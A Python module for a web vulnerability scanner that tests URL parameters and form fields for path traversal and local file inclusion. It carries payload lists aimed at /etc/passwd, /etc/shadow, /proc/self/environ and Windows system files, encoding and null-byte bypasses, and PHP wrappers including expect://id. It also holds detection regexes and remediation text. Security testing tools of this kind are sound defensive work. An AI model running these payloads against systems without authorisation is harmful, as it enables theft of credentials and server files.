import re
from urllib.parse import urlparse, parse_qs
from app.scanner.vulnerabilities.base import BaseScanner


class DirectoryTraversalScanner(BaseScanner):
    """Path Traversal / LFI scanner with encoding bypass, null-byte,
    PHP wrappers, and form input testing."""

    # ── Payloads ─────────────────────────────────────────────────────

    # Basic traversal payloads
    BASIC_PAYLOADS = [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../etc/shadow',
        '../../../etc/hosts',
        '../../../etc/hostname',
        '../../../etc/issue',
        '../../../proc/self/environ',
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\windows\\system.ini',
        '..\\..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\boot.ini',
    ]

    # Encoding bypass payloads
    ENCODED_PAYLOADS = [
        # URL encoding
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        # Double encoding
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '%252e%252e%255cetc%252fpasswd',
        # UTF-8 overlong
        '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
        # Backslash variants
        '..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\..\\etc\\passwd',
        # Null-byte (for PHP < 5.3.4)
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.html',
        '../../../etc/passwd%00.jpg',
        # Double slash filter bypass
        '....//....//....//etc/passwd',
        '....//../....//../....//../etc/passwd',
        '....\\\\....\\\\....\\\\etc\\\\passwd',
        # Dot filter bypass
        '..././..././..././etc/passwd',
        '..;/..;/..;/etc/passwd',
    ]

    # PHP wrapper payloads
    PHP_WRAPPER_PAYLOADS = [
        'php://filter/convert.base64-encode/resource=index',
        'php://filter/convert.base64-encode/resource=../config',
        'php://filter/convert.base64-encode/resource=../../../etc/passwd',
        'php://filter/read=string.rot13/resource=index',
        'php://input',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        'expect://id',
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
    ]

    # ── File content indicators ──────────────────────────────────────

    LFI_INDICATORS = [
        # /etc/passwd
        r'root:.*:0:0:',
        r'daemon:.*:\d+:\d+:',
        r'nobody:.*:\d+:\d+:',
        r'www-data:.*:\d+:\d+:',
        r'/bin/(ba)?sh',
        r'/usr/sbin/nologin',
        # /etc/shadow
        r'root:\$\d\$',
        r'root:\$[a-z0-9]+\$',
        # /etc/hosts
        r'127\.0\.0\.1\s+localhost',
        r'::1\s+localhost',
        # /etc/issue, /etc/hostname
        r'Ubuntu\s+\d+\.\d+',
        r'Debian\s+GNU/Linux',
        r'CentOS',
        r'Red\s+Hat',
        # /proc/self/environ
        r'PATH=/',
        r'HOSTNAME=',
        r'SERVER_SOFTWARE=',
        # Windows files
        r'\[fonts\]',
        r'\[extensions\]',
        r'\[boot\s*loader\]',
        r'multi\(0\)disk\(0\)',
        r'\[operating systems\]',
        # PHP wrapper base64 output
        r'^[A-Za-z0-9+/=]{50,}$',
        # PHP source code (from php:// wrappers)
        r'<\?php',
        r'<\?=',
    ]

    def _check_traversal(self, response_text):
        """Check if response contains file content indicators."""
        if not response_text:
            return False, None
        for pattern in self.LFI_INDICATORS:
            match = re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE)
            if match:
                return True, match.group(0)
        return False, None

    def _test_param(self, url, param_name, params, parsed):
        """Test a URL parameter for directory traversal."""
        all_payloads = self.BASIC_PAYLOADS + self.ENCODED_PAYLOADS + self.PHP_WRAPPER_PAYLOADS

        for payload in all_payloads:
            test_params = dict(params)
            test_params[param_name] = [payload]
            query = '&'.join(f"{k}={v[0]}" for k, v in test_params.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            response = self._request('GET', test_url)
            if response:
                found, evidence = self._check_traversal(response.text)
                if found:
                    technique = 'basic'
                    if '%' in payload:
                        technique = 'encoding bypass'
                    elif 'php://' in payload or 'file://' in payload or 'data://' in payload:
                        technique = 'PHP wrapper'
                    elif '%00' in payload:
                        technique = 'null-byte'

                    return {
                        'technique': technique,
                        'payload': payload,
                        'url': test_url,
                        'param': param_name,
                        'method': 'GET',
                        'evidence': f'File content detected: {evidence}'
                    }
        return None

    def _test_form(self, form):
        """Test form inputs for directory traversal / LFI."""
        url = form.get('action', '')
        method = form.get('method', 'get').upper()
        inputs = form.get('inputs', [])

        # Look for file-related input fields
        file_keywords = ['file', 'path', 'page', 'include', 'template', 'doc',
                         'document', 'folder', 'dir', 'view', 'content', 'load',
                         'read', 'cat', 'download', 'lang', 'language']

        testable = [inp for inp in inputs
                    if inp['type'] not in ('submit', 'button', 'image', 'reset')
                    and any(kw in inp.get('name', '').lower() for kw in file_keywords)]

        if not testable:
            testable = [inp for inp in inputs
                        if inp['type'] not in ('submit', 'button', 'hidden', 'csrf', 'image', 'reset')]

        for target_input in testable:
            for payload in self.BASIC_PAYLOADS[:5] + self.ENCODED_PAYLOADS[:3]:
                data = {}
                for inp in inputs:
                    if inp['name'] == target_input['name']:
                        data[inp['name']] = payload
                    elif inp['type'] in ('submit', 'button'):
                        data[inp['name']] = inp.get('value', 'Submit')
                    else:
                        data[inp['name']] = inp.get('value', '') or 'test'

                if method == 'POST':
                    response = self._request('POST', url, data=data)
                else:
                    response = self._request('GET', url, params=data)

                if response:
                    found, evidence = self._check_traversal(response.text)
                    if found:
                        return {
                            'technique': 'form-based',
                            'payload': payload,
                            'url': url,
                            'param': target_input['name'],
                            'method': method,
                            'evidence': f'File content: {evidence}'
                        }
        return None

    # ── Main scan ────────────────────────────────────────────────────

    def scan(self, target_url, injectable_points):
        self.findings = []
        seen = set()

        for point in injectable_points:
            # ── Forms ──
            if isinstance(point, dict) and point.get('type') == 'form':
                result = self._test_form(point)
                if result:
                    key = f"{result['url']}:{result['param']}"
                    if key not in seen:
                        seen.add(key)
                        self.findings.append(self._make_finding(result))

            # ── URL params ──
            elif isinstance(point, dict) and 'name' in point:
                url = point.get('url', target_url)
                param = point['name']
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                key = f"{url}:{param}"

                if key in seen or param not in params:
                    continue

                result = self._test_param(url, param, params, parsed)
                if result:
                    seen.add(key)
                    self.findings.append(self._make_finding(result))

        return self.findings

    def _make_finding(self, result):
        technique = result['technique']
        return {
            'vuln_type': 'directory_traversal',
            'name': f'Path Traversal / LFI ({technique})',
            'description': (
                f'Directory traversal detected via {technique}. '
                'The application allows reading arbitrary files from the server '
                'by manipulating file path parameters.'
            ),
            'impact': 'Read sensitive files (passwords, configs, source code, private keys). Can escalate to RCE via log poisoning or PHP wrappers.',
            'severity': 'high',
            'cvss_score': 7.5,
            'owasp_category': 'A01',
            'affected_url': result['url'],
            'parameter': result['param'],
            'payload': result['payload'],
            'request_data': f"{result.get('method', 'GET')} {result['url']}\nParam: {result['param']}={result['payload']}",
            'response_data': result.get('evidence', 'System file content in response'),
            'remediation': (
                'Use a whitelist of allowed files/paths. Resolve canonical paths and '
                'verify they start with the expected base directory. Never pass user '
                'input directly to file operations. Disable PHP wrappers in php.ini.'
            )
        }
